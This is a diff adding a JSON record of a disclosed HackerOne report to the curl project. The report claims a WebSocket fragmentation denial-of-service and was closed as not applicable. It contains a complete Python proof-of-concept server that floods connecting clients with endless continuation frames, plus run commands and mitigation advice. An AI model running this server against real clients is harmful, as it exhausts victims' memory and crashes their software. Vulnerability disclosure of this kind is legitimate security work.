@@ -1,0 +1,123 @@
+{
+  "id": 3303765,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzAzNzY1",
+  "url": "https://hackerone.com/reports/3303765",
+  "title": "WebSocket Fragmentation DoS on Curl Client",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-08-18T16:07:40.886Z",
+  "submitted_at": "2025-08-18T16:07:41.178Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "pelioro",
+    "url": "/pelioro",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fyib612249yt7dacxpa19yqnms8m/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-08-19T14:56:43.482Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-08-19T14:52:16.684Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\nA malicious WebSocket server can send a fragmented message (FIN=0) followed by a flood of continuation frames, causing the client (curl) to continuously allocate memory while waiting for message completion. This can result in high memory usage and potential crash (OOM), representing a Denial-of-Service vulnerability.\n\n---\n\n### Description\nThe vulnerability occurs because curl does not limit the number of continuation frames for an unfinished WebSocket message. An attacker controlling a WebSocket server can send:\n\n1. Initial text frame with `FIN=0` (indicating message continuation).  \n2. An unbounded number of continuation frames (`opcode=0`, `FIN=0`).  \n\nThis causes curl to continuously buffer incoming data until memory is exhausted. The script `ws_frag_poc.py` demonstrates the behavior.\n\n---\n\n### Steps to Reproduce\n1. Save the following PoC script as `ws_frag_poc.py`:\n\n```python\n#!/usr/bin/env python3\n# ws_frag_poc.py - DoS PoC for WebSocket fragmentation\nimport socket, base64, hashlib, threading\n\nHOST, PORT = \"0.0.0.0\", 8765\n\ndef make_handshake_response(key):\n    GUID = b\"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\"\n    accept = base64.b64encode(hashlib.sha1(key + GUID).digest()).decode()\n    return (\n        \"HTTP/1.1 101 Switching Protocols\\r\\n\"\n        \"Upgrade: websocket\\r\\n\"\n        \"Connection: Upgrade\\r\\n\"\n        f\"Sec-WebSocket-Accept: {accept}\\r\\n\\r\\n\"\n    ).encode()\n\ndef make_frame(fin, opcode, payload):\n    first = (0x80 if fin else 0x00) | (opcode & 0x0f)\n    plen = len(payload)\n    header = bytes([first])\n    if plen <= 125: header += bytes([plen])\n    elif plen < 65536: header += bytes([126]) + plen.to_bytes(2, 'big')\n    else: header += bytes([127]) + plen.to_bytes(8, 'big')\n    return header + payload\n\ndef handle_client(conn, addr):\n    data = conn.recv(4096)\n    key = next((l.split(b\":\",1)[1].strip() for l in data.split(b\"\\r\\n\") if l.lower().startswith(b\"sec-websocket-key:\")), None)\n    if not key: return conn.close()\n    conn.sendall(make_handshake_response(key))\n    conn.sendall(make_frame(fin=False, opcode=1, payload=b\"X\"*4))\n    frag_payload = b\"A\"*32\n    while True:\n        conn.sendall(make_frame(fin=False, opcode=0, payload=frag_payload))\n\ndef main():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind((HOST, PORT))\n    s.listen(5)\n    while True:\n        conn, addr = s.accept()\n        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n2. Run the PoC:  \n```bash\npython3 ws_frag_poc.py\n```\n\n3. In another terminal, connect using curl:  \n```bash\ncurl --include --no-buffer --output /dev/null ws://127.0.0.1:8765\n```\n\n4. Monitor memory usage:  \n```bash\nps -o pid,rss,cmd -p <curl_pid>\ntop -p <curl_pid>\nps aux | grep curl\n```\n\n---\n\n### Expected Result\nCurl should handle fragmented messages without unbounded memory growth.\n\n### Actual Result\nMemory usage grows continuously, CPU spikes, process may hang or crash (OOM).\n\n---\n\n### Mitigation / Recommendation\n- Implement limits on the number of continuation frames for unfinished WebSocket messages.  \n- Consider maximum message size or memory allocation threshold to prevent client-side DoS.  \n- Add proper validation of FIN/fragmented frames in the WebSocket implementation.\n\n---\n\n### References\n- [RFC 6455 - The WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)\n- CWE-400: Uncontrolled Resource Consumption\n\n## Impact\n\n- High memory consumption on the client.  \n- Potential crash or process termination (OOM) in curl.  \n- Can be triggered remotely if the client connects to a malicious WebSocket server.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 32,
+  "voters": [
+    "k0ns0l",
+    "corrupted_bytes",
+    "xven1c3",
+    "manual_mint",
+    "thalaivar304",
+    "2026",
+    "pelioro",
+    "antedeeeguemon",
+    "mai91",
+    "secureforesightlabs",
+    "and 22 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
